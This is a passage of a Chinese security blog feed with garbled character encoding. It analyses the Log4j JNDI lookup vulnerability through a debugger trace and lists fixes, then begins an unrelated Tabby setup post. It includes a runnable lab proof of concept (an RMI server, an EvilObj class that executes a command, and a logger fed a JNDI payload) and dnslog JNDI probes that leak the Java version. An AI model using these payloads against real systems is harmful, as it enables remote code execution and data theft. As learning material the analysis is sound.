class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">bootclasspath</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="tag">&lt;/<span class="name">bootclasspath</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">compilerArguments</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ³¨æ„ï¼špluginæ ‡ç­¾è¦åŒ…è£¹åœ¨pluginsä¸­ï¼Œpluginsè¦åŒ…è£¹åœ¨buildä¸­</p></blockquote><h2 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><p>ä¸€èˆ¬å°†æ—¥å¿—å¯¹è±¡å®šä¹‰ä¸ºå½“å‰ç±»ç­‰é™æ€ç§æœ‰æˆå‘˜</p><h3 id="ä½¿ç”¨å ä½ç¬¦-æ‰“å°æ—¥å¿—"><a href="#ä½¿ç”¨å ä½ç¬¦-æ‰“å°æ—¥å¿—" class="headerlink" title="ä½¿ç”¨å ä½ç¬¦{}æ‰“å°æ—¥å¿—"></a>ä½¿ç”¨å ä½ç¬¦{}æ‰“å°æ—¥å¿—</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;bob&quot;</span>;</span><br><span class="line"></span><br><span class="line">    logger.error(<span class="string">&quot;&#123;&#125; is not exited!&quot;</span>,user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æˆåŠŸæ‰“å°</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232469.jpg"                      alt="image-20221002151825195"                ><figcaption>image-20221002151825195</figcaption></figure></p><h3 id="lookups"><a href="#lookups" class="headerlink" title="lookups"></a>lookups</h3><p>å¯ä»¥é€šè¿‡<code>$&#123;xxx:xxx&#125;</code>ç­‰å½¢å¼å¿«é€Ÿè·å–è¿è¡Œåº”ç”¨å®¹å™¨çš„dockerå±æ€§ï¼Œç¯å¢ƒå˜é‡ï¼Œæ—¥å¿—äº‹ä»¶ï¼ŒJavaåº”ç”¨ç¨‹åºç¯å¢ƒä¿¡æ¯ç­‰å†…å®¹ã€‚</p><h1 id="æ¼æ´åŠåˆ†æ"><a href="#æ¼æ´åŠåˆ†æ" class="headerlink" title="æ¼æ´åŠåˆ†æ"></a>æ¼æ´åŠåˆ†æ</h1><h3 id="å½±å“ç‰ˆæœ¬èŒƒå›´"><a href="#å½±å“ç‰ˆæœ¬èŒƒå›´" class="headerlink" title="å½±å“ç‰ˆæœ¬èŒƒå›´"></a>å½±å“ç‰ˆæœ¬èŒƒå›´</h3><p>2.0-beta9 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.15.0-rc1ï¼ˆ1.xä¸å—å½±å“ï¼‰</p><p>éœ€è¦å¯¼å…¥log4j-coreæ‰è¡Œ</p><p>å…ˆç”¨2.14.0åšå®éªŒ(JDK 1.8ä¸‹)</p><blockquote><p>åŸç†ï¼šJNDIæ³¨å…¥</p></blockquote><h2 id="åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯"><a href="#åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯" class="headerlink" title="åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯"></a>åˆ©ç”¨lookupsè·å–æ•æ„Ÿä¿¡æ¯</h2><p>è¾“å‡ºJDKç‰ˆæœ¬</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOGGER.error(<span class="string">&quot;Java version :&#123;&#125;&quot;</span>,<span class="string">&quot;$&#123;java:version&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232986.jpg"                      alt="image-20221002153617894"                ><figcaption>image-20221002153617894</figcaption></figure></p><h3 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h3><p>ç»„ä»¶ä¸­lookupåŠŸèƒ½çš„å®ç°ç±»JndiLookupçš„è®¾è®¡ç¼ºé™·å¯¼è‡´ï¼Œè¿™ä¸ªç±»æ˜¯åœ¨Log4j-core-xxx.jarï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´å’ŒLog4j-coreæœ‰å…³</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232662.jpg"                      alt="image-20221002153838589"                ><figcaption>image-20221002153838589</figcaption></figure></p><p>åœ¨è°ƒç”¨lookupæ–¹æ³•å¤„æ‰“æ–­ç‚¹</p><p>JNDI lookupçš„æ–¹æ³•è°ƒç”¨åœ¨InitialContext.javaä¸­</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232530.jpg"                      alt="image-20221002154141225"                ><figcaption>image-20221002154141225</figcaption></figure></p><h3 id="Debugè¿‡ç¨‹"><a href="#Debugè¿‡ç¨‹" class="headerlink" title="Debugè¿‡ç¨‹"></a>Debugè¿‡ç¨‹</h3><p>æµ‹è¯•ä»£ç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">&quot;é‡çŒªçƒ­æ‹$&#123;jndi:ldap://atf6sq.dnslog.cn&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>ç›´æ¥ä¼ å…¥çš„å°±æ˜¯${}ä¸­çš„å†…å®¹(æ²¡æœ‰è¿‡æ»¤),ä¹Ÿæ²¡æœ‰ä¼ å…¥å…¶ä»–éƒ¨åˆ†</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232515.jpg"                      alt="image-20221002154417043"                ><figcaption>image-20221002154417043</figcaption></figure></p><p>æŸ¥çœ‹æ‰§è¡Œé“¾è¿‡ç¨‹,è¯¥lookupæ–¹æ³•åç»­åœ¨JndiLookupä¸­è¢«è°ƒç”¨</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qzrx5jggj30u204wgm9.jpg"                      alt="image-20221002154907000"                ><figcaption>image-20221002154907000</figcaption></figure></p><p>è¿‡ç¨‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">JndiLookup.java:</span><br><span class="line">var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">JndiManager.java:</span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Context.java:</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException;</span><br><span class="line"></span><br><span class="line">InitialContext.java</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"><span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä¹‹åå¤„ç†å˜é‡çš„å·¥ä½œäº¤ç»™äº†StrSubstitutorè¿™ä¸ªç±»</p><p>ä¹‹ååˆè°ƒç”¨äº†MessagePatternConverterè¿™ä¸ªç±»çš„formatæ–¹æ³•</p><ol><li>é¦–å…ˆæ˜¯noLookupsè¿™ä¸ªå±æ€§ï¼Œè®¾ç½®æˆäº†falseï¼Œå¯¼è‡´ä¸‹é¢ä»£ç çš„æ‰§è¡Œï¼ˆç°åœ¨æ¼æ´ä¿®å¤å°†è¿™ä¸ªnoLookupsè®¾ç½®æˆtrueï¼‰</li><li>åé¢çš„ifæ˜æ˜¾æ˜¯è¦å®šä½åˆ°<code>$&#123;</code>ï¼ˆå¹¶ä¸”æ˜¯è¿ç»­çš„ï¼‰ï¼Œå¦‚æœæœ‰è¿™ä¸¤ä¸ªå­—ç¬¦å°±å»replaceå‡½æ•°æ›¿æ¢</li><li>config.getStrSubstitutor()å°±æ˜¯ä¸Šé¢è¯´çš„StrSubstitutor</li></ol><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232226.jpg"                      alt="image-20221002160354461"                ><figcaption>image-20221002160354461</figcaption></figure></p><blockquote><p>Log4jå°†è¦è¾“å‡ºçš„æ—¥å¿—æ‹¼æ¥æˆå­—ç¬¦ä¸²ä¹‹åï¼Œå®ƒä¼šå»åˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«${å’Œ},å¦‚æœåŒ…å«äº†ï¼Œå°±ä¼šå½“ä½œå˜é‡äº¤ç»™StrSubstitutorè¿™ä¸ªç±»å»å¤„ç†ã€‚</p></blockquote><p>StrSubstitutorä¸­resolveVariableæ–¹æ³•è·å–${}ä¸­å­—ç¬¦ä¸²</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6r0jtfl7mj31ck05ojt3.jpg"                      alt="image-20221002161555507"                ><figcaption>image-20221002161555507</figcaption></figure></p><p>å¯ä»¥çœ‹åˆ°resolverä¸­çš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°Lookupså®šä¹‰äº†12ç§å¤„ç†ç±»å‹ï¼Œå¦‚æœèƒ½åŒ¹é…åˆ°è¿™å‡ ç§å¤„ç†ç±»å‹ï¼Œå°±äº¤ç»™å®ƒä»¬å»å¤„ç†ï¼Œå…¶ä»–çš„éƒ½ä¼šäº¤ç»™defaultLookupå»å¤„ç†ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232081.jpg"                      alt="image-20221002161942852"                ><figcaption>image-20221002161942852</figcaption></figure></p><blockquote><p>å¦‚æœæˆ‘ä»¬çš„æ—¥å¿—å†…å®¹ä¸­æœ‰<code>$&#123;jndi:rmi://127.0.0.1:1099/hello&#125;</code>è¿™äº›å†…å®¹ï¼Œå»æ‰${å’Œ}ä¼ é€’ç»™resolverçš„å°±æ˜¯<code>jndi:rmi://127.0.0.1:1099/hello</code>ã€‚resolverä¼šå°†ç¬¬ä¸€ä¸ªâ€:â€ä¹‹å‰çš„å†…å®¹å’ŒlookupsåšåŒ¹é…ï¼Œæˆ‘ä»¬è¿™é‡Œè·å–åˆ°çš„æ˜¯jndiï¼Œå°±ä¼šå°†å‰©ä½™éƒ¨åˆ†<code>jndi:rmi://127.0.0.1:1099/hello</code>äº¤ç»™jdniçš„å¤„ç†å™¨JndiLookupå»å¤„ç†ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232251.jpg"                      alt="image-20221002162800611"                ><figcaption>image-20221002162800611</figcaption></figure></p></blockquote><p>ä¼ å…¥æ˜¯ä¿¡æ¯debugæ ‡æ³¨ï¼Œæœ€å¥½ç”¨çš„lookup.lookupä¹Ÿæ˜¯JNDIçš„lookup</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232513.jpg"                      alt="image-20221002162941649"                ><figcaption>image-20221002162941649</figcaption></figure></p><blockquote><p>ä»è€Œå¾—åˆ°äº†lookupçš„ç»“æœ</p></blockquote><h3 id="noLookupsç›¸å…³"><a href="#noLookupsç›¸å…³" class="headerlink" title="noLookupsç›¸å…³"></a>noLookupsç›¸å…³</h3><p>è°ƒç”¨formate</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232599.jpg"                      alt="image-20221002171504977"                ><figcaption>image-20221002171504977</figcaption></figure></p><p>èµ‹å€¼æ“ä½œï¼ˆä½äº MessagePatternConverterç±»ä¸­ï¼‰</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">int</span> <span class="variable">noLookupsIdx</span> <span class="operator">=</span> <span class="built_in">this</span>.loadNoLookups(options);</span><br><span class="line">        <span class="built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">loadNoLookups</span><span class="params">(<span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (options != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; options.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">option</span> <span class="operator">=</span> options[i];</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;nolookups&quot;</span>.equalsIgnoreCase(option)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ç”±äºè°ƒç”¨ MessagePatternConverterç±»çš„formatæ–¹æ³• æ²¡æœ‰ä¼ å…¥optionsä¸”configéç©ºï¼Œå¹¶ä¸”ç¯å¢ƒå˜é‡ä¹Ÿæ²¡æœ‰è®¾ç½®å› æ­¤noLookupsä¸ºfalse</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232069.jpg"                      alt="image-20221002190435592"                ><figcaption>image-20221002190435592</figcaption></figure></p></blockquote><h3 id="æ¼æ´æ£€æµ‹æ–¹æ³•"><a href="#æ¼æ´æ£€æµ‹æ–¹æ³•" class="headerlink" title="æ¼æ´æ£€æµ‹æ–¹æ³•"></a>æ¼æ´æ£€æµ‹æ–¹æ³•</h3><p>é€šè¿‡dnslogï¼Œè¿˜èƒ½æŸ¥çœ‹jdkç‰ˆæœ¬æ˜¯å¦æ”¯æŒRMIæˆ–è€…ldapæœåŠ¡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:dns://$&#123;sys:java.version&#125;.dnslog/&#125;</span><br></pre></td></tr></table></figure></div><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>1ã€å‡çº§åˆ°2.17.0ç‰ˆæœ¬åŠä»¥ä¸Š</p><p>2ã€å‚æ•°ã€ç¯å¢ƒè®¾ç½®</p><ul><li><p>è®¾ç½®jvmå‚æ•°ï¼š-Dlog4j2.formatMsgNoLookups&#x3D;trueï¼Œ</p></li><li><p>è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼šFORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS&#x3D;true</p></li></ul><blockquote><p>JNDIå¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰:JDBCã€LDAPã€RMIã€DNSã€NISã€CORBA</p></blockquote><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>JDKï¼š11.0.15</p><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>JNDIç›¸å½“äºè‡ªå·±åšä¸€ä¸ªæœåŠ¡ï¼Œå¦‚æœè®¿é—®äº†ä¼šç›´æ¥åœ¨æ”¾æˆ‘è¿™æœ¬æœºä¸Šæ‰§è¡Œæ–¹æ³•ä¸­çš„ä»£ç </p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072232104.jpg"                      alt="image-20221002194642057"                ><figcaption>image-20221002194642057</figcaption></figure></p><h2 id="ç®€å•å¤ç°"><a href="#ç®€å•å¤ç°" class="headerlink" title="ç®€å•å¤ç°"></a>ç®€å•å¤ç°</h2><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072233648.jpg"                      alt="tststst"                ><figcaption>tststst</figcaption></figure></p><p>RMIServer.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cui.log4jtest.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;RMI Listener 1099 port&quot;</span>);</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">            registry.rebind(<span class="string">&quot;test&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>EvilObj.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObj</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;open a Calculator!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå¯ä»¥å†™ä»»æ„ä»£ç ï¼Œæ¯”å¦‚æœ¨é©¬ç¨‹åºï¼Œç—…æ¯’ç¨‹åºï¼Œæ­»å¾ªç¯ï¼Œåé—¨ç¨‹åºç­‰ç­‰ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>log4jDemo1.java</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/test&#125;&quot;</span>;</span><br><span class="line">            logger.info(<span class="string">&quot;è¾“å‡ºçš„ä¿¡æ¯æ˜¯:&#123;&#125;&quot;</span>, str);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å…ˆå¯åŠ¨RMIServerå†å¯åŠ¨log4jDemo1å°±ä¼šå¼¹å‡ºè®¡ç®—å™¨</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072231797.jpg"                      alt="image-20221002215727110"                ><figcaption>image-20221002215727110</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072231698.jpg"                      alt="image-20221002215800340"                ><figcaption>image-20221002215800340</figcaption></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨</title>
      <link href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨"><a href="#Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨" class="headerlink" title="Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨"></a>Tabbyå®‰è£…é…ç½®åŠä½¿ç”¨</h1><h2 id="0x00å®‰è£…"><a href="#0x00å®‰è£…" class="headerlink" title="0x00å®‰è£…"></a>0x00å®‰è£…</h2><h3 id="Neo4j-Desktop"><a href="#Neo4j-Desktop" class="headerlink" title="Neo4j Desktop"></a>Neo4j Desktop</h3><p>å®˜ç½‘ç›´æ¥ä¸‹ <a class="link"   href="https://neo4j.com/download/" >Neo4j Desktop Download | Free Graph Database Download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>ä¸‹å®Œæ‰“å¼€åˆå§‹åŒ–å®Œå¯ä»¥çœ‹åˆ°æ•°æ®åº“ç‰ˆæœ¬ï¼Œä¸‹å¯¹åº”ç‰ˆæœ¬çš„APOCæ’ä»¶ </p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321216.png"                      alt="image-20230501151304382"                ><figcaption>image-20230501151304382</figcaption></figure></p><h3 id="æ–°å»ºNeo4jå›¾æ•°æ®åº“"><a href="#æ–°å»ºNeo4jå›¾æ•°æ®åº“" class="headerlink" title="æ–°å»ºNeo4jå›¾æ•°æ®åº“"></a>æ–°å»ºNeo4jå›¾æ•°æ®åº“</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321510.png"                      alt="image-20230501152338340"                ><figcaption>image-20230501152338340</figcaption></figure></p><p>å¯ä»¥é€‰æ‹©æ›´æ–°æ•°æ®åº“ç‰ˆæœ¬åˆ°5.4.0</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305041321584.png"                      alt="image-20230501162942114"                ><figcaption>image-20230501162942114</figcaption></figure></p><p>æ‰“å¼€æ•°æ®åº“æ—çš„<code>Â·Â·Â·</code>-&gt;<code>Settings...</code>æ›´æ”¹ä»¥ä¸‹é…ç½®</p><div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 